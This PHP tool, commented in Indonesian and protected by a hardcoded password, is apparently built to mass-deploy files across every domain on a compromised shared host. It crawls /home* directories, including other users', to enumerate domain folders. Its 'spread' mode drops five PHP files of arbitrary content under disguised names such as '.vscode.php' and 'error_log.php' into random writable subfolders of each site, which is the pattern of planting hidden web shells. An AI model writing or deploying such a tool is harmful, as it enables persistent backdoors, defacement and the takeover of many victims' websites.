<?php
/**
 * Auto Upload File - Multi Domain
 * Fitur:
 *  - Password protection (?p=...)
 *  - Path AUTO-DETECT atau MANUAL
 *  - Opsi pakai public_html (on/off)
 *  - Mode Normal: 1 file ke semua domain
 *  - Mode Spread: 5 file random ke 5 folder random per domain
 * HAPUS setelah selesai digunakan!
 */

// ============ PASSWORD PROTECTION ============
$ACCESS_PASSWORD = 'Semangat45';
$givenPassword = $_GET['p'] ?? $_POST['p'] ?? '';

if (!hash_equals($ACCESS_PASSWORD, (string)$givenPassword)) {
    http_response_code(403);
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>403 - Access Denied</title>
        <style>
            * { box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background: #0f172a; color: #e2e8f0;
                margin: 0; padding: 40px 20px; min-height: 100vh;
                display: flex; align-items: center; justify-content: center;
            }
            .box {
                background: #1e293b; border: 1px solid #dc2626;
                border-radius: 12px; padding: 32px;
                max-width: 420px; width: 100%; text-align: center;
            }
            h1 { font-size: 48px; margin: 0 0 12px; color: #ef4444; }
            p { color: #94a3b8; font-size: 14px; margin: 0 0 20px; line-height: 1.6; }
            code {
                background: #0f172a; color: #fbbf24;
                padding: 3px 8px; border-radius: 4px;
                font-family: "SF Mono", Monaco, monospace; font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>🔒 403</h1>
            <p><b>Access Denied</b></p>
            <p>Akses memerlukan password.<br>
            Tambahkan <code>?p=xxxxx</code> di URL.</p>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============ AUTO-DETECT BASE DIR ============
function detectBaseDir() {
    $candidates = [];

    if (function_exists('posix_getpwuid') && function_exists('posix_getuid')) {
        $info = @posix_getpwuid(posix_getuid());
        if (!empty($info['dir'])) $candidates[] = $info['dir'];
    }
    if (!empty($_SERVER['HOME'])) $candidates[] = $_SERVER['HOME'];
    if (getenv('HOME')) $candidates[] = getenv('HOME');

    foreach ([$_SERVER['DOCUMENT_ROOT'] ?? '', __DIR__] as $src) {
        if (!$src) continue;
        $d = rtrim($src, '/');
        for ($i = 0; $i < 10; $i++) {
            if (preg_match('#^(/home\d*/[^/]+)$#', $d, $m)) {
                $candidates[] = $m[1];
                if (is_dir($m[1] . '/domains')) $candidates[] = $m[1] . '/domains';
                break;
            }
            $d = dirname($d);
        }
    }

    foreach (glob('/home*', GLOB_ONLYDIR) as $homeRoot) {
        if (!is_readable($homeRoot)) continue;
        foreach (@scandir($homeRoot) as $u) {
            if ($u === '.' || $u === '..') continue;
            $userDir = $homeRoot . '/' . $u;
            if (!is_dir($userDir) || !is_readable($userDir)) continue;

            $count = countDomainFolders($userDir);
            if ($count > 0) $candidates[] = ['path' => $userDir, 'count' => $count];

            $domainsSub = $userDir . '/domains';
            if (is_dir($domainsSub) && is_readable($domainsSub)) {
                $count = countDomainFolders($domainsSub);
                if ($count > 0) $candidates[] = ['path' => $domainsSub, 'count' => $count + 100];
            }
        }
    }

    $withCount = []; $plain = [];
    foreach ($candidates as $c) {
        if (is_array($c)) $withCount[] = $c;
        elseif (is_string($c)) $plain[] = $c;
    }
    usort($withCount, fn($a, $b) => $b['count'] - $a['count']);

    foreach (array_merge(array_column($withCount, 'path'), $plain) as $c) {
        if ($c && is_dir($c) && is_readable($c)) return $c;
    }
    return null;
}

function countDomainFolders($dir) {
    $n = 0;
    foreach (@scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        if (strpos($f, '.') === false) continue;
        if (!preg_match('/\.[a-z]{2,}$/i', $f)) continue;
        if (!is_dir($dir . '/' . $f)) continue;
        if (in_array($f, ['public_html', 'public_ftp', 'ssl', 'etc', 'logs', 'lscache', 'mail', 'tmp', 'access-logs', 'www', 'home', 'node_modules', '.git', 'cgi-bin', 'vendor', 'backup', 'backups'])) continue;
        $n++;
    }
    return $n;
}

// ============ SCAN DOMAIN ============
function scanDomains($baseDir, $usePublicHtml = true) {
    $domains = [];
    if (!is_dir($baseDir) || !is_readable($baseDir)) return $domains;

    $skipNames = ['public_html', 'public_ftp', 'ssl', 'etc', 'logs', 'lscache', 'mail', 'tmp', 'access-logs', 'www', 'home', 'node_modules', '.git', 'cgi-bin', 'vendor', 'backup', 'backups'];

    foreach (@scandir($baseDir) as $f) {
        if ($f === '.' || $f === '..') continue;
        if (strpos($f, '.') === false) continue;
        if (!preg_match('/\.[a-z]{2,}$/i', $f)) continue;
        if (in_array($f, $skipNames)) continue;

        $domainPath = rtrim($baseDir, '/') . '/' . $f;
        if (!is_dir($domainPath)) continue;

        $targetDir = $domainPath;
        $hasPublicHtml = false;

        if ($usePublicHtml) {
            $pub = $domainPath . '/public_html';
            if (is_dir($pub)) {
                $targetDir = $pub;
                $hasPublicHtml = true;
            }
        }

        $domains[] = [
            'name'           => $f,
            'path'           => $domainPath,
            'target'         => $targetDir,
            'has_public_html'=> $hasPublicHtml,
            'writable'       => is_writable($targetDir),
            'url'            => 'https://' . $f,
        ];
    }

    usort($domains, fn($a, $b) => strcmp($a['name'], $b['name']));
    return $domains;
}

// ============ SCAN SUBFOLDER ============
// Scan folder di dalam domain (untuk spread upload)
function scanSubfolders($rootDir, $maxDepth = 3, $maxFolders = 200) {
    $folders = [];
    if (!is_dir($rootDir) || !is_readable($rootDir)) return $folders;

    $skipNames = [
        'node_modules', '.git', '.svn', '.hg', '.well-known', 'cgi-bin',
        'vendor', 'tmp', 'temp', 'cache', 'logs', '.cpanel', '.trash',
        '.htpasswds', 'mail', 'etc', '.cache', '.config', '.local',
        'ssl', 'access-logs', '.softaculous', 'perl5', '.composer',
        '.npm', '.ssh', 'backup', 'backups', '.idea', '.vscode',
        '__pycache__', 'dist', 'build', '.next', '.nuxt', '.angular',
        '.sass-cache', 'coverage', '.pytest_cache', '.mypy_cache',
    ];

    $queue = [['path' => $rootDir, 'depth' => 0]];

    while (!empty($queue) && count($folders) < $maxFolders) {
        $item = array_shift($queue);
        $path = $item['path'];
        $depth = $item['depth'];

        if ($depth > $maxDepth) continue;
        if (!is_dir($path) || !is_readable($path)) continue;

        // Tambahkan folder ini ke list kalau writable
        if (is_writable($path)) {
            $folders[] = $path;
        }

        if ($depth >= $maxDepth) continue;

        $items = @scandir($path);
        if (!$items) continue;

        foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            if (in_array($f, $skipNames)) continue;
            $sub = $path . '/' . $f;
            if (is_link($sub)) continue;
            if (!is_dir($sub)) continue;
            $queue[] = ['path' => $sub, 'depth' => $depth + 1];
        }
    }

    return $folders;
}

// ============ SPREAD UPLOAD ============
// Upload 5 file ke 5 folder random berbeda
function spreadUpload($domain, $fileNames, $fileContent, $usePublicHtml = true) {
    $result = ['ok' => 0, 'fail' => 0, 'log' => [], 'files' => []];

    // Tentukan root dir target
    $rootDir = $domain['target'];
    if (!is_dir($rootDir)) {
        $result['log'][] = "❌ {$domain['name']}: target folder tidak ada";
        $result['fail'] += count($fileNames);
        return $result;
    }

    // Scan semua subfolder yang writable
    $allFolders = scanSubfolders($rootDir, 3, 200);

    if (count($allFolders) < count($fileNames)) {
        $result['log'][] = "⚠️  {$domain['name']}: hanya ada " . count($allFolders) . " folder (butuh " . count($fileNames) . ")";
        // Tetap lanjut tapi folder bisa dipakai ulang
    }

    // Shuffle folder biar random
    shuffle($allFolders);

    // Kalau folder kurang, pakai rootDir sebagai fallback
    if (empty($allFolders)) {
        $allFolders[] = $rootDir;
    }

    $usedFolders = [];
    $totalFiles = count($fileNames);

    foreach ($fileNames as $i => $fileName) {
        // Pilih folder yang belum dipakai (kalau cukup)
        $picked = null;
        if (count($allFolders) >= $totalFiles) {
            // Cukup folder → pilih yang belum dipakai
            foreach ($allFolders as $f) {
                if (!in_array($f, $usedFolders)) {
                    $picked = $f;
                    break;
                }
            }
        } else {
            // Folder kurang → pakai random ulang
            $picked = $allFolders[$i % count($allFolders)];
        }

        if ($picked === null) {
            $picked = $rootDir;
        }

        $usedFolders[] = $picked;

        // Tulis file
        $targetFile = rtrim($picked, '/') . '/' . $fileName;
        $write = @file_put_contents($targetFile, $fileContent);

        // Relative path untuk display
        $rel = str_replace(rtrim($rootDir, '/'), '', $picked);
        $rel = $rel === '' ? '/' : $rel . '/';

        if ($write !== false) {
            $result['ok']++;
            $result['files'][] = [
                'file' => $fileName,
                'path' => $rel,
                'full' => $targetFile,
            ];
        } else {
            $result['fail']++;
            $result['files'][] = [
                'file' => $fileName,
                'path' => $rel,
                'full' => $targetFile,
                'error' => true,
            ];
        }
    }

    return $result;
}

// ============ PATH MODE ============
$autoBase = detectBaseDir();

$pathMode       = $_POST['path_mode'] ?? $_GET['path_mode'] ?? 'auto';
$baseDir        = '';
$usePublicHtml  = ($_POST['use_public_html'] ?? $_GET['use_public_html'] ?? '1') === '1';

if ($pathMode === 'manual') {
    $baseDir = trim($_POST['manual_path'] ?? $_GET['manual_path'] ?? '');
} else {
    $baseDir = $autoBase ?? '';
}

// ============ PROSES SUBMIT ============
$hasil     = [];
$berhasil  = 0;
$gagal     = 0;
$skip      = 0;
$submitted = false;
$uploadMode = $_POST['upload_mode'] ?? 'normal';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['do_upload'])) {
    $submitted   = true;

    if ($baseDir === '' || !is_dir($baseDir)) {
        $hasil[] = "ERROR : Base directory tidak valid: {$baseDir}";
    } else {
        $domains = scanDomains($baseDir, $usePublicHtml);

        if (empty($domains)) {
            $hasil[] = "ERROR : Tidak ada folder domain di {$baseDir}";
        } elseif ($uploadMode === 'spread') {
            // ============ MODE SPREAD ============
            $spreadNames = ['.vscode.php', '.cache.php', 'error_log.php', 'trash.php', 'recovery.php'];
            $spreadContent = $_POST['spread_content'] ?? '<?php echo "hello world";';

            foreach ($domains as $d) {
                if (!$d['writable']) {
                    $gagal += count($spreadNames);
                    $hasil[] = "❌ GAGAL : {$d['name']} (tidak writable)";
                    continue;
                }

                $res = spreadUpload($d, $spreadNames, $spreadContent, $usePublicHtml);

                $berhasil += $res['ok'];
                $gagal += $res['fail'];

                $hasil[] = "🌐 {$d['name']}  ({$res['ok']}/" . count($spreadNames) . " berhasil)";
                foreach ($res['files'] as $f) {
                    if (empty($f['error'])) {
                        $hasil[] = "   ✅ {$d['url']}{$f['path']}{$f['file']}";
                    } else {
                        $hasil[] = "   ❌ {$f['path']}{$f['file']} (gagal tulis)";
                    }
                }
                $hasil[] = "";
            }
        } else {
            // ============ MODE NORMAL ============
            $fileName    = trim($_POST['filename'] ?? '');
            $fileContent = $_POST['content'] ?? '';

            if ($fileName === '') {
                $hasil[] = "ERROR : Nama file tidak boleh kosong.";
            } elseif (preg_match('/[\/\\\\:*?"<>|]/', $fileName)) {
                $hasil[] = "ERROR : Nama file mengandung karakter ilegal.";
            } else {
                foreach ($domains as $d) {
                    if (!$d['writable']) {
                        $gagal++;
                        $hasil[] = "GAGAL : {$d['name']} (tidak writable)";
                        continue;
                    }
                    $targetFile = rtrim($d['target'], '/') . '/' . $fileName;
                    $write = @file_put_contents($targetFile, $fileContent);
                    if ($write !== false) {
                        $berhasil++;
                        $hasil[] = "OK    : {$d['url']}/{$fileName}";
                    } else {
                        $gagal++;
                        $hasil[] = "GAGAL : {$d['name']}/{$fileName}";
                    }
                }
            }
        }
    }
}

// Preview
$previewDomains = ($baseDir && is_dir($baseDir)) ? scanDomains($baseDir, $usePublicHtml) : [];
$previewCount   = count($previewDomains);

// Helper untuk preserve password di link
$pQuery = '?p=' . urlencode($ACCESS_PASSWORD);
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Auto Upload File - Multi Domain</title>
<style>
    * { box-sizing: border-box; }
    body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        background: #0f172a; color: #e2e8f0;
        margin: 0; padding: 30px 20px; min-height: 100vh;
    }
    .container { max-width: 950px; margin: 0 auto; }
    h1 { font-size: 22px; margin: 0 0 6px; color: #38bdf8; }
    .subtitle { color: #94a3b8; font-size: 13px; margin-bottom: 24px; }
    .card {
        background: #1e293b; border: 1px solid #334155;
        border-radius: 10px; padding: 22px; margin-bottom: 20px;
    }
    label { display: block; font-size: 13px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px; }
    input[type="text"], textarea {
        width: 100%; background: #0f172a; border: 1px solid #334155;
        color: #f1f5f9; padding: 10px 12px; border-radius: 6px;
        font-size: 14px; font-family: inherit; margin-bottom: 16px;
        outline: none; transition: border-color .15s;
    }
    input[type="text"]:focus, textarea:focus { border-color: #38bdf8; }
    textarea {
        min-height: 120px; resize: vertical;
        font-family: "SF Mono", Monaco, Consolas, monospace;
    }
    button {
        background: #38bdf8; color: #0f172a; border: none;
        padding: 11px 22px; font-size: 14px; font-weight: 700;
        border-radius: 6px; cursor: pointer; transition: background .15s;
    }
    button:hover { background: #0ea5e9; }
    button:active { transform: scale(.98); }
    .btn-ghost { background: #334155; color: #e2e8f0; }
    .btn-ghost:hover { background: #475569; }
    .btn-green { background: #22c55e; }
    .btn-green:hover { background: #16a34a; }
    .btn-purple { background: #a855f7; }
    .btn-purple:hover { background: #9333ea; }

    .stats { display: flex; gap: 12px; margin-bottom: 16px; flex-wrap: wrap; }
    .stat {
        flex: 1; min-width: 100px; background: #0f172a;
        border-radius: 6px; padding: 12px; text-align: center;
    }
    .stat .num { font-size: 22px; font-weight: 700; }
    .stat .lbl { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: .5px; }
    .stat.ok .num { color: #4ade80; }
    .stat.fail .num { color: #f87171; }
    .stat.skip .num { color: #fbbf24; }
    .stat.info .num { color: #38bdf8; }

    .output-header {
        display: flex; justify-content: space-between;
        align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 8px;
    }
    .copy-btn {
        background: #334155; color: #e2e8f0;
        padding: 7px 14px; font-size: 12px;
    }
    .copy-btn:hover { background: #475569; }

    #output {
        background: #0f172a; border: 1px solid #334155;
        border-radius: 6px; padding: 14px;
        font-family: "SF Mono", Monaco, Consolas, monospace;
        font-size: 12.5px; line-height: 1.6; white-space: pre;
        overflow-x: auto; max-height: 600px; overflow-y: auto;
        color: #cbd5e1;
    }
    .warn {
        background: #7f1d1d; border: 1px solid #dc2626;
        color: #fecaca; padding: 12px 16px;
        border-radius: 6px; font-size: 13px; margin-bottom: 20px;
    }
    .info {
        background: #082f49; border: 1px solid #0ea5e9;
        color: #bae6fd; padding: 12px 16px;
        border-radius: 6px; font-size: 13px; margin-bottom: 16px;
    }
    .success-box {
        background: #14532d; border: 1px solid #22c55e;
        color: #bbf7d0; padding: 12px 16px;
        border-radius: 6px; font-size: 13px; margin-bottom: 16px;
    }
    .auth-badge {
        background: #14532d; border: 1px solid #22c55e;
        color: #bbf7d0; padding: 8px 14px; border-radius: 6px;
        font-size: 12px; margin-bottom: 16px;
        display: inline-block; font-family: "SF Mono", Monaco, monospace;
    }

    .path-mode, .upload-mode { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
    .path-mode label, .upload-mode label {
        display: flex; align-items: center; gap: 8px;
        background: #0f172a; border: 1px solid #334155;
        padding: 10px 14px; border-radius: 6px; cursor: pointer;
        font-weight: 500; margin-bottom: 0; transition: all .15s;
    }
    .path-mode input[type="radio"], .upload-mode input[type="radio"] {
        width: 18px; height: 18px; margin: 0;
        accent-color: #38bdf8; cursor: pointer;
    }
    .path-mode label.active {
        border-color: #38bdf8; background: #082f49; color: #bae6fd;
    }
    .upload-mode label.active-normal {
        border-color: #38bdf8; background: #082f49; color: #bae6fd;
    }
    .upload-mode label.active-spread {
        border-color: #a855f7; background: #3b0764; color: #e9d5ff;
    }

    .checkbox-option {
        display: flex; align-items: center; gap: 10px;
        background: #0f172a; border: 1px solid #334155;
        padding: 12px 14px; border-radius: 6px; margin-bottom: 16px;
        cursor: pointer; user-select: none;
    }
    .checkbox-option input[type="checkbox"] {
        width: 20px; height: 20px; margin: 0;
        accent-color: #38bdf8; cursor: pointer; flex-shrink: 0;
    }
    .checkbox-option .cb-label {
        margin: 0; cursor: pointer; font-weight: 500;
    }
    .checkbox-option .cb-desc {
        font-size: 11.5px; color: #94a3b8; margin-top: 2px;
    }

    .domain-preview {
        background: #0f172a; border: 1px solid #334155;
        border-radius: 6px; padding: 12px;
        max-height: 250px; overflow-y: auto;
        font-family: "SF Mono", Monaco, Consolas, monospace;
        font-size: 11.5px; line-height: 1.7; color: #cbd5e1;
        margin-bottom: 16px;
    }
    .domain-preview .dn { color: #4ade80; }
    .domain-preview .dw { color: #f87171; }
    .domain-preview .dn-fallback { color: #fbbf24; }
    .domain-preview .tag {
        display: inline-block; padding: 1px 6px; border-radius: 4px;
        font-size: 10px; margin-left: 6px; font-weight: 600;
    }
    .tag-ph { background: #14532d; color: #86efac; }
    .tag-no-ph { background: #78350f; color: #fcd34d; }
    .tag-spread { background: #3b0764; color: #e9d5ff; }

    .file-list {
        background: #0f172a; border: 1px solid #334155;
        border-radius: 6px; padding: 12px; margin-bottom: 16px;
        font-family: "SF Mono", Monaco, Consolas, monospace;
        font-size: 12px; color: #cbd5e1; line-height: 1.8;
    }
    .file-list .fl-item { color: #a855f7; }
</style>
</head>
<body>
<div class="container">
    <h1>🚀 Auto Upload File - Multi Domain</h1>
    <div class="subtitle">Pilih mode upload + path, lalu eksekusi.</div>

    <div class="auth-badge">🔓 Authenticated</div>

    <div class="warn">⚠️ <b>Hapus file ini setelah selesai digunakan!</b></div>

    <!-- FORM PATH -->
    <div class="card">
        <h2 style="font-size:15px;margin:0 0 14px;color:#38bdf8;">⚙️ Konfigurasi</h2>

        <form method="post" action="<?= htmlspecialchars($pQuery) ?>" id="pathForm">
            <input type="hidden" name="set_path" value="1">
            <input type="hidden" name="p" value="<?= htmlspecialchars($ACCESS_PASSWORD) ?>">

            <label>Mode Path</label>
            <div class="path-mode">
                <label class="<?= $pathMode === 'auto' ? 'active' : '' ?>">
                    <input type="radio" name="path_mode" value="auto" <?= $pathMode === 'auto' ? 'checked' : '' ?>
                           onchange="document.getElementById('pathForm').submit()">
                    🔍 Auto-Detect
                </label>
                <label class="<?= $pathMode === 'manual' ? 'active' : '' ?>">
                    <input type="radio" name="path_mode" value="manual" <?= $pathMode === 'manual' ? 'checked' : '' ?>
                           onchange="document.getElementById('pathForm').submit()">
                    ✏️ Manual
                </label>
            </div>

            <?php if ($pathMode === 'manual'): ?>
                <label for="manual_path">Base Directory (manual)</label>
                <input type="text" id="manual_path" name="manual_path"
                       placeholder="contoh: /home/u520296534/domains"
                       value="<?= htmlspecialchars($baseDir) ?>">
            <?php else: ?>
                <?php if ($autoBase): ?>
                    <div class="success-box">
                        ✅ Auto-detect: <code><?= htmlspecialchars($autoBase) ?></code>
                    </div>
                <?php else: ?>
                    <div class="warn">❌ Auto-detect gagal. Pakai mode Manual.</div>
                <?php endif; ?>
            <?php endif; ?>

            <label>Opsi Folder</label>
            <label class="checkbox-option">
                <input type="checkbox" name="use_public_html" value="1" <?= $usePublicHtml ? 'checked' : '' ?>
                       onchange="document.getElementById('pathForm').submit()">
                <div>
                    <div class="cb-label">📁 Tambahkan <code>public_html</code> di akhir path</div>
                    <div class="cb-desc">
                        ✅ Centang: <code>domain.com/public_html/...</code><br>
                        ☐ Tidak centang: <code>domain.com/...</code>
                    </div>
                </div>
            </label>

            <button type="submit" class="btn-ghost">🔄 Terapkan</button>
        </form>
    </div>

    <!-- PREVIEW DOMAIN -->
    <?php if ($baseDir && is_dir($baseDir)): ?>
    <div class="card">
        <h2 style="font-size:15px;margin:0 0 14px;color:#38bdf8;">📋 Preview Domain (<?= $previewCount ?>)</h2>
        <div class="info">
            📁 Base: <code><?= htmlspecialchars($baseDir) ?></code>
            | 📁 Mode: <b><?= $usePublicHtml ? 'public_html' : 'tanpa public_html' ?></b>
            <?php if ($previewCount > 0): ?> | 🌐 <?= $previewCount ?> domain<?php endif; ?>
        </div>

        <?php if ($previewCount > 0): ?>
            <div class="domain-preview">
                <?php foreach ($previewDomains as $d): ?>
                    <div>
                        <?php if (!$d['writable']): ?>
                            <span class="dw">❌ <?= htmlspecialchars($d['name']) ?> (tidak writable)</span>
                        <?php elseif ($d['has_public_html']): ?>
                            <span class="dn">✅ <?= htmlspecialchars($d['name']) ?><span class="tag tag-ph">public_html</span></span>
                        <?php else: ?>
                            <span class="dn-fallback">⚠️ <?= htmlspecialchars($d['name']) ?><span class="tag tag-no-ph">no public_html</span></span>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php else: ?>
            <div class="warn">⚠️ Tidak ada folder domain di path ini.</div>
        <?php endif; ?>
    </div>
    <?php elseif ($baseDir): ?>
        <div class="card">
            <div class="warn">❌ Path tidak valid: <code><?= htmlspecialchars($baseDir) ?></code></div>
        </div>
    <?php endif; ?>

    <!-- FORM UPLOAD -->
    <?php if ($baseDir && is_dir($baseDir) && $previewCount > 0): ?>
    <div class="card">
        <h2 style="font-size:15px;margin:0 0 14px;color:#38bdf8;">📤 Upload</h2>

        <form method="post" action="<?= htmlspecialchars($pQuery) ?>" id="uploadForm">
            <input type="hidden" name="do_upload" value="1">
            <input type="hidden" name="p" value="<?= htmlspecialchars($ACCESS_PASSWORD) ?>">
            <input type="hidden" name="path_mode" value="<?= htmlspecialchars($pathMode) ?>">
            <input type="hidden" name="manual_path" value="<?= htmlspecialchars($pathMode === 'manual' ? $baseDir : '') ?>">
            <input type="hidden" name="use_public_html" value="<?= $usePublicHtml ? '1' : '0' ?>">

            <label>Mode Upload</label>
            <div class="upload-mode">
                <label class="<?= $uploadMode === 'normal' ? 'active-normal' : '' ?>">
                    <input type="radio" name="upload_mode" value="normal" <?= $uploadMode === 'normal' ? 'checked' : '' ?>
                           onchange="toggleMode('normal')">
                    📄 Normal (1 file)
                </label>
                <label class="<?= $uploadMode === 'spread' ? 'active-spread' : '' ?>">
                    <input type="radio" name="upload_mode" value="spread" <?= $uploadMode === 'spread' ? 'checked' : '' ?>
                           onchange="toggleMode('spread')">
                    🎯 Spread (5 file random)
                </label>
            </div>

            <!-- MODE NORMAL -->
            <div id="modeNormal" style="display:<?= $uploadMode === 'normal' ? 'block' : 'none' ?>">
                <label for="filename">Nama File</label>
                <input type="text" id="filename" name="filename" placeholder="contoh: sell.txt"
                       value="<?= htmlspecialchars($_POST['filename'] ?? 'sell.txt') ?>">

                <label for="content">Isi File</label>
                <textarea id="content" name="content" placeholder="contoh: hello world"><?= htmlspecialchars($_POST['content'] ?? 'hello world') ?></textarea>

                <button type="submit" class="btn-green">⚡ Upload ke <?= $previewCount ?> Domain</button>
            </div>

            <!-- MODE SPREAD -->
            <div id="modeSpread" style="display:<?= $uploadMode === 'spread' ? 'block' : 'none' ?>">
                <div class="info">
                    🎯 <b>Mode Spread</b>: Setiap domain akan mendapat 5 file berikut, tersebar ke <b>5 folder random berbeda</b> dalam domain tersebut:
                </div>

                <div class="file-list">
                    <div class="fl-item">1. .vscode.php</div>
                    <div class="fl-item">2. .cache.php</div>
                    <div class="fl-item">3. error_log.php</div>
                    <div class="fl-item">4. trash.php</div>
                    <div class="fl-item">5. recovery.php</div>
                </div>

                <label for="spread_content">Isi File (sama untuk semua)</label>
                <textarea id="spread_content" name="spread_content" placeholder="contoh: <?php echo 'hello'; ?>"><?= htmlspecialchars($_POST['spread_content'] ?? '<?php echo "hello world";') ?></textarea>

                <button type="submit" class="btn-purple">🎯 Spread Upload ke <?= $previewCount ?> Domain (<?= $previewCount * 5 ?> file)</button>
            </div>
        </form>

        <script>
        function toggleMode(mode) {
            document.getElementById('modeNormal').style.display = (mode === 'normal') ? 'block' : 'none';
            document.getElementById('modeSpread').style.display = (mode === 'spread') ? 'block' : 'none';
            // Update active class
            const labels = document.querySelectorAll('.upload-mode label');
            labels.forEach(l => {
                l.classList.remove('active-normal', 'active-spread');
            });
            if (mode === 'normal') labels[0].classList.add('active-normal');
            else labels[1].classList.add('active-spread');
        }
        </script>
    </div>
    <?php endif; ?>

    <!-- HASIL -->
    <?php if ($submitted): ?>
    <div class="card">
        <div class="output-header">
            <h2 style="font-size:16px;margin:0;color:#38bdf8;">📊 Hasil Eksekusi</h2>
            <button class="copy-btn" onclick="copyOutput()">📋 Copy Hasil</button>
        </div>

        <div class="stats">
            <div class="stat ok"><div class="num"><?= $berhasil ?></div><div class="lbl">Berhasil</div></div>
            <div class="stat fail"><div class="num"><?= $gagal ?></div><div class="lbl">Gagal</div></div>
            <div class="stat info"><div class="num"><?= $berhasil + $gagal ?></div><div class="lbl">Total</div></div>
        </div>

        <div id="output"><?= htmlspecialchars(implode("\n", $hasil)) ?></div>
    </div>

    <script>
    function copyOutput() {
        const text = document.getElementById('output').innerText;
        navigator.clipboard.writeText(text).then(() => {
            const btn = event.target;
            const orig = btn.innerText;
            btn.innerText = '✅ Tersalin!';
            setTimeout(() => btn.innerText = orig, 1500);
        }).catch(() => {
            const ta = document.createElement('textarea');
            ta.value = text;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            alert('Hasil tersalin!');
        });
    }
    </script>
    <?php endif; ?>
</div>
</body>
</html>